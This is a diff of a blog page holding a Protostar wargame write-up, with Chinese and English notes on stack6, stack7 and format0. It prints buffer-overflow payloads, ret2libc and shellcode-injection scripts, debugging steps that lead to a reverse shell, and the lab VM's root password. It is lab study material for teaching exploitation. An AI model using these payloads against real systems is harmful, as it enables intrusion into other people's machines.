@@ -117,7 +117,7 @@
 
       <div class="read-time">
         <small>
-          3 minute read
+          4 minute read
         </small>
       </div>
 
@@ -147,6 +147,7 @@ nebula.iso download:    http://pan.baidu.com/s/1nvq3f5J
 some witeup:    
     https://lightless.me/archives/protostar-stack-writeup.html
     http://bug.cool/2016/Protostar_Writeup/
+    https://lightless.me/archives/protostar-format-writeup.html
 </code></pre>
 </div>
 
@@ -279,7 +280,7 @@ link knowledge:
 
 <h4 id="x06-stack6">0x06 stack6</h4>
 <div class="highlighter-rouge"><pre class="highlight"><code>mykey:
-    构造如下链：
+    构造如下链:
     'A'*80+system_addr+exit_addr+command_addr+command(='/bin/sh\x00')
     gdb stack6
     disas getpath
@@ -297,7 +298,7 @@ link knowledge:
     python -c "print 'A'*80+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\x58\xf7\xff\xbf'+'echo succeed'+'\x00'" | ./stack6ython -c "print 'A'*80+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\x48\xf7\xff\xbf'+'/bin/sh\x00'" | ./stack6
     the output is not obviously
     python -c "print 'A'*80+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\x28\xf8\xff\xbf'+'echo 123456'+'\x00'" | /opt/protostar/bin/stack6
-    output:看上去什么也没发生，应该没有执行成功，然而后来gdb却发现可以成功，具体如下
+    output:看上去什么也没发生,应该没有执行成功,然而后来gdb却发现可以成功,具体如下
     cd /tmp
     vi stack6.py
     --------/tmp/stack6.py----------
@@ -310,7 +311,7 @@ link knowledge:
     r &lt; /tmp/stack6.txt
     vi /tmp/succeed.txt
     output:succeed
-    此时已经成功写文件，奇怪！居然只有在gdb调试的时候用finish才会成功执行,而不用上面的gdb的过程无法成功执行命令
+    此时已经成功写文件,奇怪!居然只有在gdb调试的时候用finish才会成功执行,而不用上面的gdb的过程无法成功执行命令
 </code></pre>
 </div>
 
@@ -349,14 +350,70 @@ link knowledge:
     shellcode += "\x09\x02\x53\xe8\x92\x9d\xb5"
     
     ret=0x08048492
-    payload = 'A'*80+struct.pack("&lt;I",ret)+'BBBBBBBB'+'\x41\x41\x41\x41'+shellcode
+    payload = 'A'*80+struct.pack("&lt;I",ret)+'BBBBBBBB'+'\x41\x41\x41\x41' #without shellcode here
     f=open("/tmp/stack7.txt","a+")
     f.write(payload)
     f.close()
     input=payload
     #print input
-    os.system("echo '%s' | /opt/protostar/bin/stack5" % input)
+    #os.system("echo '%s' | /opt/protostar/bin/stack7" % input) #执行此行时会发生乱码影响shellcode_addr的查找,这句先不执行
     -------------end-------------
+    gdb /opt/protostar/bin/stack7
+    disas getpath
+    b*getpath+128(at ret in getpath func)
+    r &lt; /tmp/stack7.txt
+    x/20x $esp
+    output:
+    0xbffff73c:     0x08048492      0x42424242      0x42424242      0x41414141
+    0xbffff74c:     0xb7eadc00      0x00000001      0xbffff7f4      0xbffff7fc
+    so shellcode_addr=0xbffff74c
+    vi /tmp/stack7.py
+    ------add shellcode and modified shellcode_addr------
+    payload = 'A'*80+struct.pack("&lt;I",ret)+'BBBBBBBB'+'\x4c\xf7\xff\xbf'+shellcode
+    ...
+    os.system("echo '%s' | /opt/protostar/bin/stack7" % input)
+    -----------------------end---------------------------
+    rm stack7.txt
+    python stack7.py
+    失败,系统乱码,并未反弹shell,于是分析core文件,gdb动态调试时的地址不一定是正确的
+    ulimit -c unlimited
+    -------modify /tmp/stack7.py--------
+    payload = 'A'*80+struct.pack("&lt;I",ret)+'BBBBBBBB'+'\x4c\xf7\xff\xbf'
+    ...
+    #os.system("echo '%s' | /opt/protostar/bin/stack7" % input)
+    ---------------end------------------
+    rm stack7.txt
+    python stack7.py
+    /opt/protostar/bin/stack7 &lt; /tmp/stack7.txt
+    su 
+    godmode
+    chmod 777 co[tab]
+    gdb -q -c co[tab]
+    x/20x $esp-4
+    output:
+    0xbffff848:     0xbffff83c      0x90909090      0x90909090      0x90909090
+    0xbffff858:     0x90909090      0x90909090      0x90909090      0x90909090
+    ---------modify /tmp/stack7.py--------
+    payload = 'A'*80+struct.pack("&lt;I",ret)+'BBBBBBBB'+'\x4c\xf8\xff\xbf'+shellcode
+    ...
+    os.system("echo '%s' | /opt/protostar/bin/stack7" % input)
+    ------------------end-----------------
+    rm stack7.txt
+    python stack7.py
+    msf receive a shell connect from protostar
+</code></pre>
+</div>
+
+<h4 id="x07-format0">0x07 format0</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    ./format0 `python -c "print 'A'*64+'\xef\xbe\xad\xde'"`
+    但是题目要求输入为10字节以内,so
+    ./format0 `python -c "print '%64d' + '\xef\xbe\xad\xde'"`
+</code></pre>
+</div>
+
+<h4 id="x08-format1">0x08 format1</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
 </code></pre>
 </div>
 
